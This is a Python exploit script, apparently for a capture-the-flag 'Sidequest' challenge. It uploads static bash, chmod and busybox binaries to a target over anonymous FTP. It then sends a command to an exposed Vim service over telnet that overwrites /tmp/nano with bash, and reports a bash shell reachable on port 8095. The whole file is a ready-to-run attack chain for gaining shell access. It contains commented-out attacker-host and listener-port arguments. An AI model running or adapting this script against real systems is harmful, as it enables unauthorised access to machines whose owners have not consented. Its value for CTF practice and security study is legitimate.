# Sidequest4 exploit script
import argparse
from os import chmod
import telnetlib
import time
from ftplib import FTP


# Function to send Vim commands
def sendVimCommand(conn, command):
    try:
        conn.write(command.encode('utf-8') + b'\n') 
        time.sleep(1) # Just to make sure everything works fine
        return 200
    except Exception as e:
        with open("logs", 'a') as logfile:
            logfile.write(f'{str(e)}\n--------------------------')
        return 404


# Function to upload binaries through FTP
def uploadBinary(fileList):
    ftpPort = 8075
    ftp = FTP()
    ftp.connect(address, ftpPort)
    ftp.set_pasv(False)
    authStatus = ftp.login()
    toUpload = 3  # Just a counter to keep track of the successful uploads


    if '230' in authStatus:
        for file in fileList:
            for filePath, fileName in file.items():   # Getting the key, value from the dictionary
                with open(filePath, 'rb') as f:
                    try:
                        ftp.storbinary(f'STOR {fileName}', f)
                        toUpload-=1
                    except Exception as e:
                        with open("logs", 'a') as logfile:
                            logfile.write(f'{str(e)}\n--------------------------')
                time.sleep(1)

    if toUpload == 0:  # If all files are uploaded successfully, we return 200.
        return 200
    else:
        return 404



def main(address):
    vimPort = 8085

    # Upload static binaries into the target machine through ftp
    fileList = [
        {
            './binaries/bash': 'bash',
            './binaries/chmod': 'chmod',
            './binaries/busybox': 'busybox',
        }
    ]

    status = uploadBinary(fileList)
    if status == 200:
        print("Binaries uploaded successfully")
    else:
        print("Some of the binaries was failed to upload. check the binaries/ dir and the file permissions.")
        return -1




    # Open the uploaded bash and overwrite the nano binary
    try:
        print("Overwriting nano binary with bash . . .")
        conn = telnetlib.Telnet(address, vimPort)
        command = ':edit /tmp/ftp/bash | :w! /tmp/nano | :q' # This command opens /tmp/ftp/bash and save (overwrites) as /tmp/nano
        response = sendVimCommand(conn, command)
        time.sleep(2)

        if response == 404:
            print("Error occured, check logfile.")
            return

        print("Bash shell now accessible on port 8095")
    finally:
        conn.close()








if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Sidequest 3 pwn script')
    parser.add_argument("--address", "-a", dest = "address", required = True, help = "Server IP Address")
    # parser.add_argument("--lhost", "-lh", dest = "lhost", required = True, help = "Attacker Host IP")
    # parser.add_argument("--lport", "-lp", dest = "lport", required = True, help = "Attacker Listener Port")
    args = parser.parse_args()
    address = args.address
    # lhost = args.lhost
    # lport = args.lport
    main(address)
